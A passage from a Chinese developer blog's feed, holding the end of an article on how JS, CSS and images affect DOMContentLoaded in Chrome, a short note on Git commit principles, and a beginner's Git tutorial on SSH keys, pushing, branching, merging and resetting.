<p>现代浏览器会并发的预加载CSS, JS，也就是一开始就并发的请求这些资源，但是，执行CSS和JS的顺序还是按原来的依赖顺序（JS的执行要等待位于其前面的CSS和JS加载、执行完）。先加载完成的资源，如果其依赖还没加载、执行完，就只能等着。</p>
<h3 id="实验3：img何时开始解码、绘制？"><a href="#实验3：img何时开始解码、绘制？" class="headerlink" title="实验3：img何时开始解码、绘制？"></a>实验3：img何时开始解码、绘制？</h3><p>从图三中我们可以发现一个有趣的地方：img的请求老早就发出了，但延迟了一段时间才开始解码。如图二、图三中的红框所示，截图中只框出了一部分表示解码的记录，而实际上这些表示解码的记录一直持续到img加载结束，如图四所示，img是一边加载一边解码的：</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/7384a57a-a256-11e3-9c4a-b857956eaeed.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/7384a57a-a256-11e3-9c4a-b857956eaeed.png" alt="7384a57a-a256-11e3-9c4a-b857956eaeed"></a><br>图四</p>
<p>抱着“猜想——验证”的想法，我猜想这是因为img这个资源是否需要展现出来，需要等 <strong>所有的JS和CSS的执行完</strong> 才知道，因为main.js可能会执行某些DOM操作，比如删除这个img元素，或者修改其src属性，而CSS可能会将其 <code>display: none</code> 。</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084830tW2.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084830tW2.jpg" alt="image"></a></p>
<p>图五</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084831TR6.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084831TR6.jpg" alt="image"></a></p>
<p>图六</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084832Sa1.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084832Sa1.jpg" alt="image"></a><br>图七</p>
<p>图五中没有JS和CSS，img的数据一接收到就马上开始解码了。<br>图六中没有JS，但img要等到CSS加载完才开始解码。<br>图七的代码跟图六的代码唯一的区别是CSS把img给 <code>display: none;</code> ，这使得img虽然请求了，但根本没有进行解码。<br>这说明，img是否需要解码、绘图（paint）出来，确实需要等CSS加载、执行完才能知道。也就是说，CSS会阻塞img的展现！那么JS呢？</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084833Gpg.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084833Gpg.jpg" alt="image"></a><br>图八</p>
<p>图八对应的代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">        <span class="built_in">console</span>.timeStamp(<span class="string">'Inline script in head'</span>);</div><div class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.timeStamp(<span class="string">'DOMContentLoaded event'</span>);</div><div class="line">        &#125;);</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/chrome-girl.jpg"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./js/main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>非常令人惊讶，在有JS而没有CSS的页面中，img居然能够在收到数据后就立刻开始解码、绘图（paint)，也就是说，JS并没有阻塞img的展现！这跟我们以前理解的JS会阻塞img资源的传统观念不太一样，看来Chrome对img的加载和展现做了新的优化。</p>
<p>##</p>
<p>我们常用的jQuery的 <code>$(document).ready()</code> 方法，就是对DOMContentLoaded事件的监听（当然，其内部还会通过模拟DOMContentLoaded事件和监听onload事件来提供降级方案）。通常推荐在DOMContentLoaded事件触发的时候为DOM元素注册事件。所以尽快的让DOMContentLoaded事件触发，就意味着能够尽快让页面可交互：</p>
<ol>
<li>减小CSS文件体积，把单个CSS文件分成几个文件以并行加载，减少CSS对JS的阻塞时间</li>
<li>次要的JS文件，通过动态插入script标签来加载（动态插入的script标签不阻塞DOMContentLoaded事件的触发）</li>
<li>CSS中使用的精灵图，可以利用对img的预加载，放在html中跟CSS文件一起加载</li>
</ol>
<p>在做实验的过程中，感觉Chrome开发者工具的Timeline面板非常强大，浏览器的一举一动都记录下来。以前我们前端开发要想理解、探索浏览器的内部行为，或者摸着石头过河的做黑盒测试，或者事倍功半的研究浏览器源码，唯一高效点的做法就是学习别人的研究经验，看老外的文章，但浏览器的发展日新月异（比如这次实验发现的JS不阻塞img的展现），别人的经验始终不是最新、最适合的，关键是要结合自己的业务、需求场景，有针对性的做分析和优化。</p>
<p>##</p>
<p>PS.</p>
<p>以上测试环境为windows/chrome，并用Fiddler模拟慢速网络</p>
<p>原创文章转载请注明：</p>
<p>转载自AlloyTeam：<a href="http://www.alloyteam.com/2014/03/effect-js-css-and-img-event-of-domcontentloaded/" target="_blank" rel="external">http://www.alloyteam.com/2014/03/effect-js-css-and-img-event-of-domcontentloaded/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;JS、CSS以及img对DOMContentLoaded事件的影响&quot;&gt;&lt;a href=&quot;#JS、CSS以及img对DOMContentLoaded事件的影响&quot; class=&quot;headerlink&quot; title=&quot;JS、CSS以及img对DOMContentLoad
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="DOMContentLoaded" scheme="http://www.wanglinzhizhi.me/tags/DOMContentLoaded/"/>
    
      <category term="浏览器内核" scheme="http://www.wanglinzhizhi.me/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8/"/>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Git 的提交</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/Git%20%E6%8F%90%E4%BA%A4%E5%8E%9F%E5%88%99/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/Git 提交原则/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Git-的提交"><a href="#Git-的提交" class="headerlink" title="Git 的提交"></a>Git 的提交</h2><h3 id="提交原则"><a href="#提交原则" class="headerlink" title="提交原则"></a>提交原则</h3><p><strong>频繁提交代码 -&gt; 事务性提交.</strong> </p>
<ul>
<li><strong>提交代码的频率与合并带来的工作量成反比</strong></li>
<li><strong>尽早提交代码有利于别人把你的代码集成进去,加快项目的进展</strong> </li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Git-的提交&quot;&gt;&lt;a href=&quot;#Git-的提交&quot; class=&quot;headerlink&quot; title=&quot;Git 的提交&quot;&gt;&lt;/a&gt;Git 的提交&lt;/h2&gt;&lt;h3 id=&quot;提交原则&quot;&gt;&lt;a href=&quot;#提交原则&quot; class=&quot;headerlink&quot; titl
    
    </summary>
    
      <category term="Git" scheme="http://www.wanglinzhizhi.me/categories/Git/"/>
    
    
      <category term="Git" scheme="http://www.wanglinzhizhi.me/tags/Git/"/>
    
      <category term="Git 使用" scheme="http://www.wanglinzhizhi.me/tags/Git-%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Git使用简明</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/Git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%8E/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/Git使用简明/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Git使用简明"><a href="#Git使用简明" class="headerlink" title="Git使用简明"></a>Git使用简明</h2><p>by wanglinzhizhi</p>
<p><br><br><br><br><br><br></p>
<h1 id="Git的简明教程"><a href="#Git的简明教程" class="headerlink" title="Git的简明教程"></a>Git的简明教程</h1><p>我试着写一下git的简单使用说明,如有错误的地方,欢迎斧正.</p>
<p>:)</p>
<p><br><br></p>
<h2 id="首先-下载并安装git-废话"><a href="#首先-下载并安装git-废话" class="headerlink" title="首先,下载并安装git.(废话)"></a>首先,下载并安装git.(废话)</h2><p><a href="https://git-scm.com/download/win" target="_blank" rel="external">git 下载地址</a></p>
<p><br><br><br><br></p>
<h2 id="生成公钥秘钥-并绑定到gogs-代码管理中心上"><a href="#生成公钥秘钥-并绑定到gogs-代码管理中心上" class="headerlink" title="生成公钥秘钥,并绑定到gogs 代码管理中心上."></a>生成公钥秘钥,并绑定到<code>gogs</code> 代码管理中心上.</h2><p>在初次使用git的时候需要做的一件事,之后使用过程中不需要这么做了.</p>
<p><br><br></p>
<p>可以把这个过程认为是一个认证过程.我以我的理解讲解一下.详细的可以参考</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">https://help.github.com/articles/generating-an-ssh-key/</div></pre></td></tr></table></figure>
<p> 简单的说,2个步骤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1. 生成秘钥.公钥</div><div class="line">truessh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;</div><div class="line">trueEnter a file in which to save the key (/Users/you/.ssh/id_rsa): [Press enter]</div><div class="line">trueEnter passphrase (empty for no passphrase): [Type a passphrase]</div><div class="line">trueEnter same passphrase again: [Type passphrase again]</div><div class="line"></div><div class="line">2. 绑定到 代码托管中心服务器中 .在个人页面 -&gt; 用户设置 -&gt;管理SSH密钥-&gt; 增加密钥</div><div class="line">   将生成的id_rsa.pub(这个文件所在的目录是C:/users/XXX/.ssh/id_sra.pub) 拷贝到 密钥内容部分.</div><div class="line"></div><div class="line"></div><div class="line">至此,绑定完成.</div></pre></td></tr></table></figure>
<p>在以后的使用中,你的每一次提交,每一次clone,每一次push,每一pull,都是这个账号的, 如果你注册了两个git账号,想push操作的话,可以吗? 如果不修改 <code>.gitconfig</code> 文件中的配置, 很有可能因权限问题报错. 在使用中,这一点常常被我们所忽略.</p>
<p><br><br></p>
<p>这是一个服务器log的截图</p>
<p><img src="/images/git/e.png" alt="服务器日志文件截图"></p>
<p><br><br></p>
<h2 id="建立远端仓库和本地仓库的关联-并将本地仓库同步到远端"><a href="#建立远端仓库和本地仓库的关联-并将本地仓库同步到远端" class="headerlink" title="建立远端仓库和本地仓库的关联,并将本地仓库同步到远端."></a>建立远端仓库和本地仓库的关联,并将本地仓库同步到远端.</h2><p>git是一个分布式的系统. 在<code>远端</code>(咱们用的也就是那个测试服务器上)和<code>本地端</code>都有仓库(所谓仓库,也就是你的项目存放的地方). 我们怎么把自己的代码提交到远端的服务器上呢.</p>
<p><br><br><br></p>
<p>主要命令有以下四条.</p>
<p><strong>首先</strong>,我们通过浏览器在服务器上建立一个仓库.(<strong>最好不要把readme勾选</strong> ). 在你想放该文件的文件夹下面,右键-&gt;打开git bash.  执行以下命令</p>
<p>标准做法如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git remote add origin http://172.20.17.20:3001/wanglinzhizhi/XXXX.git</div></pre></td></tr></table></figure>
<p>就是<strong>建立关联的过程</strong> .</p>
<p><br><br></p>
<p><strong>然后</strong>,当你写好代码(文档,更新内容)后,为说明方面,我们假设完成的文件叫<code>index.html</code>, 放到这个仓库(文件夹下面) , 然后执行命令.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git add index.html</div></pre></td></tr></table></figure>
<p><strong>再然后</strong> , 执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git commit -m &apos;这是我的一次测试性的更新说明,我更新了index.html文件.对结构进行了优化.&apos;</div></pre></td></tr></table></figure>
<p><strong>Notes</strong>: 执行完<code>git add XX</code> 和 <code>git commit &#39;blablabla&#39;</code> 之后 至此本地仓库的commit以及版本已经建立完成. 下一步,我们是将本地的仓库 push到服务器中.让代码保存在服务器中.</p>
<p><strong>最后</strong>  ,依然在<code>git bash</code>中执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git push</div></pre></td></tr></table></figure>
<p>然后输入你的gogs的邮箱和密码. 直到显示 <code>...done</code> 表示提交完成. 至此,我们完成了将本地仓库push到远端仓库. 可以再浏览器中再次打开你刚才<code>创建</code> ,并且<code>clone</code> ,并且<code>push</code>的仓库了.</p>
<p>:)</p>
<p><strong>Notes</strong>　： 在使用中非常重要也非常基本的一个命令是, <code>git status</code> .通过这个命令, 我们可以知道当前的状况.在什么情况下使用呢?  恩, 在不知道当前什么状况的情况下使用.</p>
<p>还有一个比较常用的命令, <code>git XXX -h</code>  .  这里的XXX(比如 push, pull,log 等)git命令,  在不知道git XXX命</p>
<p>令怎么使用的时候, 可以 直接在后面加一个<code>-h</code> ,显示出帮助文件. 像这样(<code>git push -h</code>,  <code>git pull -h</code>)</p>
<p>个人感觉,这几天的使用经验来说,git是一个很友好的工具, 因为在你输入错误 的情况下,它能够很智能的提示.</p>
<p><br><br></p>
<p>总结一下,</p>
<p>远端和本地端的绑定需执行一行代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git remote add origin http://172.20.17.20:3001/wanglinzhizhi/XXXX.git</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<p>每次git 提交到服务器有三个步骤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git add (你想add的文件.)</div><div class="line">git commit -m &apos;xxxx&apos;</div><div class="line">git push</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<p><strong>NOTES:</strong></p>
<p>另一种不是标准做法的方法,<code>clone</code> 这是一种比较偷懒的方法, 严格意义上说是错误的,因为仅仅对于那些你是<code>master</code> 权限的人才可以这样操作. 因为这么clone之后(或者直接pull) 弄了之后,就建立了关联.</p>
<p><strong>Note: 注意git操作时对应的文件夹(血泪教训(T_T)</strong></p>
<p><br></p>
<p><br></p>
<p><br></p>
<p><br></p>
<p><br></p>
<p><br></p>
<h2 id="一个接近实际中的项目上传实例"><a href="#一个接近实际中的项目上传实例" class="headerlink" title="一个接近实际中的项目上传实例"></a>一个接近实际中的项目上传实例</h2><p><br><br></p>
<p>我本地有个t6multivan_m(1)M的项目. 我现在要将其传到远端git服务器怎么做呢? 这里是真是用到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git remote add origin XXX</div><div class="line">git push -u origin master(Mac)</div><div class="line"></div><div class="line">  git push --set-upstream origin master(windows)</div></pre></td></tr></table></figure>
<p>的地方.</p>
<p>具体如下:</p>
<p>首先进入到对应项目文件夹 ,然后空白处右键鼠标-&gt;git bash</p>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git init</div></pre></td></tr></table></figure>
<p><br><br></p>
<p>我们在本地仓库中先提交项目.操作过程是上面的提交过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">// git status</div><div class="line">git add -A</div><div class="line"></div><div class="line">//git status</div><div class="line">git commit -m &apos;这是一个接近真实环境的项目上传操作&apos;</div></pre></td></tr></table></figure>
<p>到这里,本地的仓库已经完成,现在我们将其push到远端服务器上的仓库中.</p>
<ol>
<li><p>为了上传到远端的服务器中,我需要先用浏览器,在远端仓库中创建一个仓库.(<strong>建议写成同名的</strong>)</p>
<p>然后将远端的仓库和本地的仓库关联起来.</p>
<p>在本地git bash中执行以下命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git remote add origin http://192.168.15.75:3141/wanglinzhizhi/t6multivanM.git</div></pre></td></tr></table></figure>
<p>这条命令使本地端和远端建立关联.</p>
</li>
<li><p>最后一步,</p>
<p>Mac上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git push -u origin master</div></pre></td></tr></table></figure>
<p>Windows上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git push --set-upstream origin master</div></pre></td></tr></table></figure>
</li>
</ol>
<p><br><br><br><br></p>
<p>步骤截图如下:</p>
<ul>
<li><img src="/images/git/a.png" alt="init and add -A"></li>
</ul>
<ul>
<li><img src="/images/git/b.png" alt="commit"></li>
<li><img src="/images/git/c.png" alt="commit"></li>
</ul>
<ul>
<li><img src="/images/git/d.png" alt="remote add origin push"></li>
</ul>
<p>当第一次建立了仓库之后,以后每次使用的时候最常用的两个命令<code>git pull</code> , <code>git push</code> .</p>
<p>我们还会经常使用到的一个命令 <code>git log</code>  或者 <code>git log --graph</code>. 执行这个命令可以帮助我们查看 历史提交记录.</p>
<p><br><br></p>
<p>我觉得一些良好的习惯对于项目管理是有作用的.</p>
<ul>
<li>每天临走之前,git push 一下今天的代码, 第二天来了继续工作之前,git pull 一下,把远端的最新的代码, 同步到本地.</li>
<li>每次完成 了重大的部分或者一个单独的单元的时候, git push 一下.</li>
</ul>
<p>需要注意的是,始终保持远端的仓库是最新的就可以了.  上述的几个命令已经够我们玩转单击版的Git了. 下一节我们将讲解branch 和 merge操作.</p>
<p>另一个比较好的习惯是 **建立一个Git 仓库(Git-repos). 所有的项目都放在这里仓库下面.每个项目只需要一个文件夹,不再需要建立N个zip压缩包,等我们push到服务器之后,谁想下压缩包自己去服务器上去取就够了.</p>
<p><br><br><br><br></p>
<h2 id="Caching-your-GitHub-password-in-Git"><a href="#Caching-your-GitHub-password-in-Git" class="headerlink" title="Caching your GitHub password in Git"></a><a href="https://help.github.com/articles/caching-your-github-password-in-git/#platform-all" target="_blank" rel="external">Caching your GitHub password in Git</a></h2><p>If you’re <a href="https://help.github.com/articles/which-remote-url-should-i-use" target="_blank" rel="external">cloning GitHub repositories using HTTPS</a>, you can use a <em>credential helper</em> to tell Git to remember your GitHub username and password every time it talks to GitHub.</p>
<p>If you clone GitHub repositories using SSH, then you authenticate using SSH keys instead of a username and password. For help setting up an SSH connection, see <a href="https://help.github.com/articles/generating-an-ssh-key" target="_blank" rel="external">Generating an SSH Key</a>.</p>
<p><strong>Tip:</strong> You need Git <strong>1.7.10</strong> or newer to use the credential helper.</p>
<p>The credential helper is included with GitHub Desktop. The app also provides a Git shell so you won’t ever need to install and configure Git manually. For more information, see “<a href="https://help.github.com/desktop/guides/getting-started/" target="_blank" rel="external">Getting Started with GitHub Desktop</a>.”</p>
<p>If you prefer working with the command line, you can also install a native Git shell, such as <a href="https://git-for-windows.github.io/" target="_blank" rel="external">Git for Windows</a>. With Git for Windows, running the following in the command line will store your credentials:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git config --global credential.helper wincred</div></pre></td></tr></table></figure>
<p>这是从GitHub 上粘过来的 一段 . 作用是 自动保存密码,不用每次push的时候都输入一遍账号密码,神烦.只需要 在git bash中输入 上面的一行代码, 然后再 输入一次账号密码,以后就再也不需要输入了.(^_ ^)</p>
<p><br><br></p>
<p><br><br><br><br></p>
<p>参考资料:</p>
<p><a href="https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-%E5%88%9D%E6%AC%A1%E8%BF%90%E8%A1%8C-Git-%E5%89%8D%E7%9A%84%E9%85%8D%E7%BD%AE" target="_blank" rel="external">起步 - 初次运行 Git 前的配置</a></p>
<p><a href="https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E8%AE%B0%E5%BD%95%E6%AF%8F%E6%AC%A1%E6%9B%B4%E6%96%B0%E5%88%B0%E4%BB%93%E5%BA%93" target="_blank" rel="external">git 官方中文版文档</a></p>
<p><a href="https://git-scm.com/book/zh/v1/" target="_blank" rel="external">git pro 中文版</a></p>
<p><br><br><br><br><br><br><br><br><br><br><br><br></p>
<p>银河系,晚安 :)</p>
<p><br><br><br><br><br><br><br></p>
<p>update 2016.09.18</p>
<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p> 有两种简单方法的git使用方法,比较推荐,虽然确实有很多git客户端,但是比较推崇的,个人觉得vscode ,和github for desktop 客户端. 因为颜值高.如下图:</p>
<p><strong>vs code</strong></p>
<p><img src="/images/git/vsc.png" alt=""></p>
<p><strong>github</strong></p>
<p><em>**</em><img src="/images/git/github.png" alt=""></p>
<p><br><br><br><br><br><br><br><br><br><br><br><br></p>
<h2 id="branch-and-merge-分支与合并操作"><a href="#branch-and-merge-分支与合并操作" class="headerlink" title="- branch and merge (分支与合并操作)"></a>- branch and merge (分支与合并操作)</h2><p><strong>branch 顾名思义就是 建立分支的意思.</strong></p>
<p><br><br></p>
<p>在使用branch的功能的时候,我们主要会用到的命令有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git branch</div></pre></td></tr></table></figure>
<p><code>git branch</code> 命令的功能是将分支的名字以列表的形式显示出来.同时可以确定当前所在的分支(* 号表示我们现在所在的分支) .</p>
<p><br></p>
<p>下面2条命令如下: 作用是在当前的基础上,创建一个新的分支.并把分支命名为AnewBranchDemo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git branch AnewBranchDemo</div><div class="line">git checkout AnewBranchDemo</div></pre></td></tr></table></figure>
<p>第一句的意思是创建<code>AnewBranchDemo</code> 这个分支,第二句的 意思是 是当前分支为 <code>AnewBranchDemo</code> 这个分支上.(由此我们可以知道,如果我们想切换回<code>master</code> 分支,我们需要做的就是执行<code>git checkout master</code> 即可.)</p>
<p><br><br></p>
<p>这两条命令可以简化为1条命令,如下.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git checkout -b AnewBranchDemo</div></pre></td></tr></table></figure>
<p>但是个人建议最开始使用的时候还是用上面2条命令比较好. 语义上更加容易理解.</p>
<p><br><br><br></p>
<p><strong>分支是一种很好的东西.</strong> 当我们在实现某个功能的时候, 我们需要大面积修改源代码.但是有不想破坏已经修改好的 部分,,如果这里的修改改坏了,改动得太多,连自己都忘了那些地方改了的,那些没改,想回溯就将是已将痛苦不堪的事情了…….</p>
<p><br><br></p>
<p>当然 有一种原始的做法是备份一个文件夹放在旁边我们就把备份的文件夹覆盖该坏掉的文件. 这是可以的. 只是麻烦.</p>
<p><br><br></p>
<p>我们运用分支的 话,那么我们只需<code>git branch feature-Test</code> . 然后放心的在<code>feature-Test</code> 做实验,如果这里的实验成功了,我们<code>merge</code>回到<code>master</code> 中即可. 如果另一种情况,我们改的太多,连自己都不知道那些改了哪些没改的话, 我们可以干脆的放弃掉这个分支. 重新给予<code>master</code> 创建分支 <code>git branch feature-TestB</code> . 干净利落.</p>
<p><br><br></p>
<p>:)</p>
<p><br><br><br></p>
<p><strong>branch 顾名思义就是 建立分支的作用</strong>   ,<strong>相对分支的是 merge , 合并的作用</strong></p>
<p><br><br></p>
<p>主干分支 , <code>master</code> 使我们分支<code>branch</code>的起点, 也是我们 合并分支的终点.</p>
<p><br><br></p>
<p>主干分支一般是作为正式版存在的,我们所有的修改,所有的测试都是在分支上进行,直到我们确定 分支上没有问题之后,我们再将其合并到主干分支上.</p>
<p><br><br></p>
<h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1><p>合并操作中,我们主要用到的命令如下:</p>
<p><br><br><br><br></p>
<p><strong>首先</strong>,  我们要确定我们要把谁合并到谁上. 假设我们完成了feature-Test 的功能. 我们希望把feature-Test合并到 master中. 那么我们首先需要切换到master上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git checkout master</div></pre></td></tr></table></figure>
<p><strong>然后</strong> 合并<code>featrue-Test</code>分支 执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git merge --no-ff featrue-Test</div></pre></td></tr></table></figure>
<p>Notes: <strong>–no-ff 参数的目的是为了在历史记录中明确的记录下本次合并</strong>.</p>
<p><br><br></p>
<p><strong>done.</strong></p>
<p>创建分支,并且 合并分支就完成了.</p>
<p><br><br></p>
<p>总结一下分支和合并过程.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">//创建分支</div><div class="line">git branch feature-Test // 创建新的分支feature-Test</div><div class="line">git checkout feature-Test //从master上切换到 feature-Test</div><div class="line"></div><div class="line">//合并分支</div><div class="line">git checkout master //切换到主干分支</div><div class="line">git merge --no-ff featrure-true // 合并到主分支.</div></pre></td></tr></table></figure>
<p><br><br><br><br></p>
<p>现在你可以去看看master中是不是多了你刚才写在feature-Test的那段代码.(废话…)</p>
<p><br><br></p>
<p>在这个过程中,我们可以有事儿没事儿像之前使用<code>git status</code> 一样,多多使用<code>git branch</code> 和 <code>git log --graph</code> .  当提交的次数多了,会非常壮观.</p>
<p><br></p>
<p>:)</p>
<p><br><br><br><br></p>
<p>最后,别忘了合并会主干之后,<code>git push</code>到远端 服务器. 用一种拉风的说法,这叫 <code>云备胎(备份)</code> .</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">至此,到了这一步,</div><div class="line">如果想把版本弄错,或者想改错版本, 提交错版本 将是一件非常困难并且复杂的事情.</div><div class="line"></div><div class="line">:)</div></pre></td></tr></table></figure>
<p><br><br><br><br></p>
<p> <strong>代码管理中,如果发生了错误的commit ,或者错误的merge 怎么办呢?</strong></p>
<p>答: <strong>回滚</strong></p>
<p>我们使用命令<code>git log</code> 或者<code>git log --graph</code>的时候,会看到</p>
<p>commit 后面的一大串字符串. 其实这串字符串是git为我们生成的版本号.</p>
<p>我们的每一次commit , git 都会为我们创建一个新的版本. 所以每一次commit之后都会有一个对应的长长的一大串字符串. 如下图</p>
<p><img src="/images/git/f.png" alt=""></p>
<p>对于错误的commit 我们需要做的就是<strong>回滚</strong>到对应的<strong>上一个正确的版本</strong></p>
<p>需执行的代码.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git reset --hard c23efd0806f0a117122fdc118f43f6a33905895e</div></pre></td></tr></table></figure>
<p>执行上述 reset 回滚操作,我们就回到了对应的版本的代码.</p>
<p>一键还原.</p>
<p><br><br><br></p>
<p>问题来了,那么对于,merge操作导致 的错误呢? 一样的,也是使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git reset --hard XXXXcommit对应的版本号XXX</div></pre></td></tr></table></figure>
<p>git其实还有一些非常常用的功能,</p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git diff</div></pre></td></tr></table></figure>
<p>等</p>
<p>另外一方面,我这里主要在讲解git命令行的使用, 我这里没有提到或者很少提到浏览器中打开的效果.其实浏览器中的效果是十分惊艳的. 截图如下.</p>
<p><img src="/images/git/g.png" alt=""></p>
<p><br><br><br><br></p>
<p><img src="/images/git/h.png" alt=""></p>
<p><img src="/images/git/j.png" alt=""></p>
<p>这是可视化的git diff 绿色是新添加的代码, 红色是删除的代码。</p>
<p><br><br><br><br></p>
<p><img src="/images/git/k.png" alt=""></p>
<p><img src="/images/git/l.png" alt=""></p>
<p>待发行的版本, 需要看的话,可以直接从这里下载源码.</p>
<p><br><br><br><br><br><br><br><br><br><br><br><br></p>
<h2 id="团队合作的git操作-GitFlow"><a href="#团队合作的git操作-GitFlow" class="headerlink" title="- 团队合作的git操作 GitFlow"></a>- 团队合作的git操作 GitFlow</h2><h3 id="gt"><a href="#gt" class="headerlink" title="&gt;_"></a>&gt;_</h3><h3 id="详见GitFlow-工作流"><a href="#详见GitFlow-工作流" class="headerlink" title="详见GitFlow 工作流"></a>详见GitFlow 工作流</h3><p><br><br><br><br><br><br><br><br><br><br><br><br></p>
<h1 id="邮件系统"><a href="#邮件系统" class="headerlink" title="邮件系统"></a>邮件系统</h1><p><strong>done</strong></p>
<p><br><br></p>
<ul>
<li>开启了登录验证</li>
<li>开启了Notification</li>
<li>开启TSL加密</li>
</ul>
<p>:)</p>
<p><br><br></p>
<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
<h1 id="nginx-反代"><a href="#nginx-反代" class="headerlink" title="nginx 反代"></a>nginx 反代</h1><p><strong>building…..</strong></p>
<p>我懒,不想弄^_ ^</p>
<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
<p>晚安 银河系</p>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
